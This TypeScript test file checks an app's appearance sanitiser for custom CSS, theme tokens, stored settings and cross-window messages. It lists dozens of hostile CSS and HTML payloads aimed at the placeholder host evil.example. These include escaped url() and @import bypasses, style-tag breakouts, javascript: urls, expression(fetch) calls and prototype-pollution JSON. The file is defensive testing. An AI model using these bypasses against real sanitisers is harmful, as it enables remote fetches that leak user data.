/**
 * Adversarial tests for the appearance sanitiser. The policy under test: nothing a theme file,
 * a stored setting, another window or the custom CSS field supplies may make the app fetch
 * from a remote host; only `selida-file:` and `data:image/` urls are allowed.
 */
import { describe, expect, it } from 'vitest'
import { PRESET_MAP } from './presets'
import {
  MAX_CUSTOM_CSS_LENGTH,
  MAX_IMAGE_LENGTH,
  MAX_VALUE_LENGTH,
  buildCss,
  cleanValue,
  effectiveValueIn,
  emptyAppearance,
  readAppearanceMessage,
  sanitizeAppearance,
  sanitizeCustomCss
} from './sanitize'
import { TOKEN_MAP } from './schema'

const t = (name: string) => TOKEN_MAP[name]

/** Every payload points at this host. */
const EVIL = 'evil.example'

/**
 * An independent and deliberately crude check, sharing no code with the sanitiser: with all
 * escapes flattened, no fetching function or at-rule is left with anything but a local target.
 */
function expectNoRemote(css: string): void {
  const flat = css.replace(/\\[0-9a-f]{1,6}\s?/gi, 'X').replace(/\\/g, '')
  expect(flat).not.toMatch(/@\s*(import|namespace)/i)
  expect(flat).not.toMatch(/(image-set|image|src|expression)\s*\(/i)
  for (const match of flat.matchAll(/url\s*\(\s*["']?([^"')]*)/gi)) {
    expect(match[1]).toMatch(/^(selida-file:|data:image\/)/i)
  }
}

describe('custom css: no remote requests', () => {
  const bypasses: [string, string][] = [
    ['plain url', `a{background:url(https://${EVIL}/x.png)}`],
    ['quoted url', `a{background:url("https://${EVIL}/x.png")}`],
    ['protocol-relative url', `a{background:url(//${EVIL}/x.png)}`],
    ['upper case', `a{background:URL(https://${EVIL}/x)}`],
    ['mixed case with spaces', `a{background:uRl(   'https://${EVIL}/x'   )}`],
    ['hex escape in the function name', `a{background:\\75rl(https://${EVIL}/x)}`],
    ['padded hex escape', `a{background:\\000075 rl(https://${EVIL}/x)}`],
    ['escaped letters', `a{background:u\\72\\6c(https://${EVIL}/x)}`],
    ['simple escape in the name', `a{background:ur\\l(https://${EVIL}/x)}`],
    ['escapes inside the url', `a{background:url(ht\\74ps://${EVIL}/x)}`],
    ['escapes inside a quoted url', `a{background:url("\\68ttps://${EVIL}/x")}`],
    ['remote url with a local-looking tail', `a{background:url(https://${EVIL}/selida-file:x)}`],
    ['leading space before a remote url', `a{background:url("  https://${EVIL}/x")}`],
    ['escaped newline before the scheme', `a{background:url("\\a https://${EVIL}/x")}`],
    ['javascript url', `a{background:url(javascript:fetch('//${EVIL}'))}`],
    ['data url that is not an image', `a{background:url(data:text/html,<a href=//${EVIL}>)}`],
    ['file url', `a{background:url(file:///c:/${EVIL})}`],
    ['unterminated url at the end', `a{background:url(https://${EVIL}/x`],
    ['unterminated quoted url at the end', `a{background:url("https://${EVIL}/x`],
    ['bad string hiding the next rule', `a{color:'x\n}b{background:url(https://${EVIL}/x)}`],
    ['string continued over a newline', `a{content:"x\\\n";background:url(https://${EVIL}/x)}`],
    ['quote opened inside a comment', `/* " */a{background:url(https://${EVIL}/x)}/* " */`],
    ['comment opened inside a string', `a{content:"/*";background:url(https://${EVIL}/x)}`],
    ['url after a comment-split decoy', `a{background:ur/**/l(x) url(https://${EVIL}/x)}`],
    ['number glued to the function', `a{background:1.url(https://${EVIL}/x)}`],
    ['unicode-range style prefix', `a{background:u+1url(https://${EVIL}/x)}`],
    ['non-ascii prefix', `a{background:\u00d7url(https://${EVIL}/x)}`],
    ['null byte in the name', `a{background:u\u0000rl(https://${EVIL}/x)}`],
    ['null byte in the at-keyword', `@imp\u0000ort "https://${EVIL}/a.css";`],
    ['carriage returns and form feeds', `a{background:url(\r\n\f"https://${EVIL}/x"\r)}`],
    ['@import with a string', `@import "https://${EVIL}/a.css";`],
    ['@import with url()', `@import url(https://${EVIL}/a.css) screen;`],
    ['@import with a semicolon in the url', `@import url("https://${EVIL}/a;b.css");a{color:red}`],
    ['@import upper case', `@IMPORT 'https://${EVIL}/a.css';`],
    ['@import with escapes', `@\\69mport "https://${EVIL}/a.css";`],
    ['@import with a trailing escape', `@impor\\74 "https://${EVIL}/a.css";`],
    ['@import split by a comment', `@import/**/"https://${EVIL}/a.css";`],
    ['nested @import', `@im@import "x";port "https://${EVIL}/a.css";`],
    ['@import spliced by </style', `@imp</styleort "https://${EVIL}/a.css";`],
    ['url spliced by </style', `a{background:ur</stylel(https://${EVIL}/x)}`],
    ['</style case variant', `a{background:ur</StYlEl(https://${EVIL}/x)}`],
    ['@import without a semicolon', `@import "https://${EVIL}/a.css"`],
    ['@namespace', `@namespace url(https://${EVIL}/ns);`],
    ['image-set with a bare string', `a{background:image-set("https://${EVIL}/x" 1x)}`],
    ['-webkit-image-set', `a{background:-webkit-image-set("https://${EVIL}/x" 1x)}`],
    ['image-set fed through var()', `:root{--u:"https://${EVIL}/x"}a{background:image-set(var(--u) 1x)}`],
    ['image-set with escapes', `a{background:\\69mage-set("https://${EVIL}/x" 1x)}`],
    ['image()', `a{background:image("https://${EVIL}/x")}`],
    ['src()', `@font-face{font-family:x;src:src("https://${EVIL}/f.woff2")}`],
    ['@font-face src', `@font-face{font-family:x;src:url(https://${EVIL}/f.woff2) format("woff2")}`],
    ['cross-fade', `a{background:cross-fade(url(https://${EVIL}/a), url(https://${EVIL}/b))}`],
    ['expression', `a{width:expression(fetch("//${EVIL}"))}`],
    ['token override inside custom css', `:root{--wall-image:url(https://${EVIL}/x)}`],
    [
      'cursor, list-style, mask, content',
      `a{cursor:url(//${EVIL}/c),auto;list-style:url(//${EVIL}/l);mask:url(//${EVIL}/m);content:url(//${EVIL}/n)}`
    ],
    ['url with modifiers', `a{background:url("https://${EVIL}/x" foo)}`],
    ['nested parentheses in a bad url', `a{background:url(https://${EVIL}/x(y)z)}`]
  ]

  it.each(bypasses)('blocks: %s', (_name, payload) => {
    const out = sanitizeCustomCss(payload)
    expectNoRemote(out)
    // A fixed point: sanitising again changes nothing, so nothing was spliced together.
    expect(sanitizeCustomCss(out)).toBe(out)
  })

  it('removes the remote reference itself, not just its name', () => {
    expect(sanitizeCustomCss(`a{background:url(https://${EVIL}/x.png)}`)).toBe('a{background:}')
    expect(sanitizeCustomCss(`a{background:\\75rl(https://${EVIL}/x)}`)).toBe('a{background:}')
    expect(sanitizeCustomCss(`a{background:image-set("https://${EVIL}/x" 1x)}b{}`)).toBe('a{background:}b{}')
    expect(sanitizeCustomCss(`@import url("https://${EVIL}/a;b.css");a{color:red}`)).toBe('a{color:red}')
    expect(sanitizeCustomCss(`@namespace url(https://${EVIL}/ns);a{}`)).toBe('a{}')
    expect(sanitizeCustomCss(`a{color:'x\n}b{background:url(https://${EVIL}/x)}`)).not.toContain(EVIL)
    expect(sanitizeCustomCss(`a{background:u\u0000rl(https://${EVIL}/x)}`)).not.toContain(EVIL)
    expect(sanitizeCustomCss(`a{background:url("\\68ttps://${EVIL}/x")}`)).not.toContain(EVIL)
    expect(sanitizeCustomCss(`a{content:"x\\\n";background:url(https://${EVIL}/x)}`)).not.toContain(EVIL)
  })

  it('keeps local urls and ordinary css untouched', () => {
    const keep = [
      'a{background:url("selida-file://images/a.png")}',
      "a{background:url('data:image/png;base64,AAAA')}",
      'a{background:URL( selida-file://images/a.png )}',
      'a{background:url(data:image/svg+xml;utf8,%3Csvg%3E)}',
      '@media (min-width: 1px){.a{color:red}}',
      '@font-face{font-family:x;src:local("Inter")}',
      '.a::before{content:"\\2014  url(https://example.com) @import";color:var(--accent)}',
      '.a\\:b{background:linear-gradient(red, blue)}',
      '/* url(https://example.com) @import "x"; */.a{}',
      '.a{width:calc(100% - var(--indent));transform:translate(1px, 2px)}'
    ]
    for (const css of keep) expect(sanitizeCustomCss(css)).toBe(css)
  })

  it('normalises newlines and drops control characters', () => {
    expect(sanitizeCustomCss('a{}\r\nb{}\rc{}\fd{}')).toBe('a{}\nb{}\nc{}\nd{}')
    expect(sanitizeCustomCss('a{col\u0000or:red\u0007}')).toBe('a{color:red}')
  })

  it('gives up on input that keeps producing something to remove', () => {
    const nested = `${'@im'.repeat(40)}@import "x";${'port "x";'.repeat(40)}a{}`
    expect(sanitizeCustomCss(nested)).toBe('')
  })

  it('stays within the cap and terminates on hostile sizes', () => {
    const out = sanitizeCustomCss(`a{background:url(https://${EVIL}/x)}`.repeat(5000))
    expect(out.length).toBeLessThanOrEqual(MAX_CUSTOM_CSS_LENGTH)
    expectNoRemote(out)
    expect(sanitizeCustomCss('\\'.repeat(MAX_CUSTOM_CSS_LENGTH + 5)).length).toBe(MAX_CUSTOM_CSS_LENGTH)
    expect(sanitizeCustomCss('('.repeat(MAX_CUSTOM_CSS_LENGTH + 5)).length).toBe(MAX_CUSTOM_CSS_LENGTH)
    expect(sanitizeCustomCss(`image-set(${'('.repeat(40_000)}`)).toBe('')
    expect(sanitizeCustomCss(`@import ${'"'.repeat(49_000)}`)).toBe('')
  })
})

describe('token values: no remote requests, no way out of the declaration', () => {
  it('rejects every way of spelling a resource function or ending the declaration', () => {
    for (const name of ['--accent', '--font-sans', '--shadow-card', '--ease']) {
      const token = t(name)
      for (const value of [
        `url(https://${EVIL}/x)`,
        `URL("https://${EVIL}/x")`,
        `url (https://${EVIL}/x)`,
        `\\75rl(https://${EVIL}/x)`,
        `ur/**/l(https://${EVIL}/x)`,
        `image-set("https://${EVIL}/x" 1x)`,
        `-webkit-image-set("https://${EVIL}/x" 1x)`,
        `image("https://${EVIL}/x")`,
        `src("https://${EVIL}/x")`,
        `cross-fade(url(https://${EVIL}/x), red)`,
        `expression(alert(1))`,
        `red</style><img src=https://${EVIL}/x>`,
        `red</STYLE>`,
        `red</sty;le>`,
        `red\u0000`,
        `red\u001b`,
        `"unterminated`,
        `red)`,
        `(red`
      ]) {
        expect(cleanValue(token, value), `${name}: ${JSON.stringify(value)}`).toBeNull()
      }
      // What is left of an attempt to open a new declaration or rule cannot do either.
      for (const value of [`red;background:url(https://${EVIL}/x)`, `red}body{background:url(https://${EVIL}/x)`]) {
        const cleaned = cleanValue(token, value)
        expect(cleaned === null || !/[;{}]/.test(cleaned), `${name}: ${value}`).toBe(true)
        expect(cleaned ?? '').not.toContain(EVIL)
      }
    }
  })

  it('only lets image tokens point at app files and image data', () => {
    const image = t('--wall-image')
    for (const value of [
      `url("https://${EVIL}/x.png")`,
      `url("//${EVIL}/x.png")`,
      `url("http://${EVIL}/x.png")`,
      `url("file:///c:/x.png")`,
      `url("javascript:alert(1)")`,
      `url("data:text/html,x")`,
      `url(" selida-file://a.png")`,
      `url("selida-file://a.png") url("https://${EVIL}/x")`,
      `url("selida-file://a\\.png")`,
      `url("selida-file://a.png")}body{color:red`,
      `image-set("selida-file://a.png" 1x)`,
      `url("data:image/png;base64,${'A'.repeat(MAX_IMAGE_LENGTH)}")`
    ]) {
      expect(cleanValue(image, value), value.slice(0, 80)).toBeNull()
    }
    expect(cleanValue(image, 'URL("SELIDA-FILE://images/a.png")')).toBe('URL("SELIDA-FILE://images/a.png")')
  })

  it('rejects numbers outside the range of their control', () => {
    expect(cleanValue(t('--font-scale'), '0')).toBeNull()
    expect(cleanValue(t('--font-scale'), '99')).toBeNull()
    expect(cleanValue(t('--font-scale'), '1.5')).toBe('1.5')
    expect(cleanValue(t('--glass-blur'), '99999px')).toBeNull()
    expect(cleanValue(t('--glass-blur'), '-1px')).toBeNull()
    expect(cleanValue(t('--text-body'), 'calc(0px * var(--font-scale))')).toBeNull()
    expect(cleanValue(t('--text-body'), 'calc(999px * var(--font-scale))')).toBeNull()
    expect(cleanValue(t('--text-body'), 'calc(18px * var(--font-scale))')).toBe('calc(18px * var(--font-scale))')
    expect(cleanValue(t('--weight-bold'), '9'.repeat(400))).toBeNull()
    expect(cleanValue(t('--duration'), '1e3ms')).toBeNull()
  })

  it('caps very long values instead of passing them through', () => {
    const long = cleanValue(t('--font-sans'), 'Inter, '.repeat(100_000))
    expect(long === null || long.length <= MAX_VALUE_LENGTH).toBe(true)
  })
})

describe('imported and stored state is untrusted', () => {
  it('does not pollute or consult prototypes', () => {
    const hostile: unknown = JSON.parse(
      '{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}},' +
        '"light":{"__proto__":{"--accent":"#ff0000"},"constructor":"x","toString":"x","hasOwnProperty":"x"},' +
        '"shared":{"__proto__":"x","valueOf":"1px"},"presetId":"__proto__"}'
    )
    const data = sanitizeAppearance(hostile)
    expect(data).toEqual({ ...emptyAppearance(), presetId: '__proto__' })
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
    expect(Object.getPrototypeOf(data.light)).toBe(Object.prototype)
    expect(Object.keys(data.light)).toEqual([])
    // Lookups by name never reach Object.prototype.
    for (const name of ['constructor', '__proto__', 'toString', 'hasOwnProperty']) {
      expect(TOKEN_MAP[name]).toBeUndefined()
      expect(PRESET_MAP[name]).toBeUndefined()
      expect(effectiveValueIn(data, name, 'light')).toBe('')
    }
  })

  it('survives type confusion', () => {
    for (const junk of [
      { light: 'x', dark: 1, shared: null, customCss: {}, presetId: [] },
      { light: ['--accent', '#ff0000'], customCss: ['@import "x";'] },
      { light: { '--accent': { toString: () => '#ff0000' } }, dark: { '--accent': ['#ff0000'] } },
      { light: { '--accent': null }, shared: { '--glass-blur': 10 }, customCss: 42, presetId: 7 },
      [],
      42,
      undefined
    ]) {
      expect(sanitizeAppearance(junk)).toEqual(emptyAppearance())
    }
  })

  it('applies the url policy to everything a theme file carries', () => {
    const data = sanitizeAppearance({
      light: { '--accent': `url(https://${EVIL}/x)` },
      dark: { '--shadow-card': `0 0 0 red, url(https://${EVIL}/x)` },
      shared: { '--font-sans': `image-set("https://${EVIL}/x" 1x)`, '--wall-image': `url("//${EVIL}/x.png")` },
      customCss: `@import "https://${EVIL}/a.css";body{background:\\75rl(https://${EVIL}/x)}`
    })
    expect(buildCss(data)).not.toContain(EVIL)
    expect(data).toEqual({ ...emptyAppearance(), customCss: 'body{background:}' })
  })

  it('re-sanitising stored state is stable', () => {
    const data = sanitizeAppearance({
      light: { '--accent': '#ff0000' },
      shared: { '--wall-image': 'url("selida-file://images/a.png")', '--glass-blur': '10px' },
      customCss: '.a{background:url("selida-file://images/a.png")}\r\n@import "x";',
      presetId: 'glass'
    })
    expect(data.shared['--wall-image']).toBe('url("selida-file://images/a.png")')
    expect(sanitizeAppearance(JSON.parse(JSON.stringify({ version: 1, ...data })))).toEqual(data)
  })
})

describe('messages from other windows', () => {
  const data = sanitizeAppearance({ light: { '--accent': '#ff0000' }, customCss: '.a{}' })

  it('accepts only the expected envelope', () => {
    expect(readAppearanceMessage({ type: 'appearance', version: 1, data })).toEqual(data)
    for (const junk of [
      null,
      undefined,
      'appearance',
      42,
      [],
      data,
      {},
      { type: 'appearance', version: 2, data },
      { type: 'other', version: 1, data },
      { type: 'appearance', version: 1 },
      { type: 'appearance', version: 1, data: 'x' },
      { type: 'appearance', version: 1, data: [data] }
    ]) {
      expect(readAppearanceMessage(junk)).toBeNull()
    }
  })

  it('sanitises the state a message carries', () => {
    const received = readAppearanceMessage({
      type: 'appearance',
      version: 1,
      data: {
        light: { '--accent': `url(https://${EVIL}/x)`, '--danger': '#00ff00' },
        customCss: `body{background:url(https://${EVIL}/x)}`,
        presetId: '../../x'
      }
    })
    expect(received).toEqual({
      ...emptyAppearance(),
      light: { '--danger': '#00ff00' },
      customCss: 'body{background:}'
    })
  })
})
